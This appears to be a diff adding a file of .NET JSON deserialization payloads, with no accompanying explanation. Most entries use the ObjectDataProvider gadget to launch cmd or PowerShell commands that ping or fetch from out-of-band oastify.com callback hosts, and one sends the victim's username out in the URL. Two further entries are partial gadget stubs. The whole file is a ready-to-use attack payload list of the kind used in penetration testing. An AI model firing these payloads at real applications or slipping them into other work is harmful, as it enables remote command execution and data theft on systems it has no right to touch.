@@ -1,0 +1,92 @@
+[
+  {
+    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+    "MethodName": "Start",
+    "MethodParameters": {
+      "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+      "$values": ["cmd", "/c ping 68cdn9kr6xetxuomu6js77zzsqyim8ax.oastify.com"]
+    },
+    "ObjectInstance": {
+      "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+    }
+  }
+]
+
+
+
+
+
+
+{
+  "$type": "System.Security.Principal.WindowsIdentity, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+  "System.Security.ClaimsIdentity.actor": "<base64 binary blob>"
+}
+
+
+
+
+
+
+[
+  {
+    "$type":"Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties, Microsoft.PowerShell.Editor, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+    "ForegroundBrush":"<?xml version='1.0' encoding='utf-16'?><ObjectDataProvider MethodName='Start' ...>"
+  }
+]
+
+
+
+
+[
+  {
+    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+    "MethodName": "Start",
+    "MethodParameters": {
+      "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+      "$values": ["cmd", "/c powershell -c iwr http://umk11xyfklshbi2a8uxglvdn6ec60yon.oastify.com"]
+    },
+    "ObjectInstance": {
+      "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+    }
+  }
+]
+
+
+
+
+
+
+
+[
+  {
+    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+    "MethodName": "Start",
+    "MethodParameters": {
+      "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+      "$values": ["cmd", "/c powershell -c \"iwr http://yourid.oastify.com/env=$env:USERNAME\""]
+    },
+    "ObjectInstance": {
+      "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+    }
+  }
+]
+
+
+
+
+
+
+
+[
+  {
+    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+    "MethodName": "Start",
+    "MethodParameters": {
+      "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+      "$values": ["cmd", "/c powershell -c \"iwr http://your.oastify.com\""]
+    },
+    "ObjectInstance": {
+      "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+    }
+  }
+]
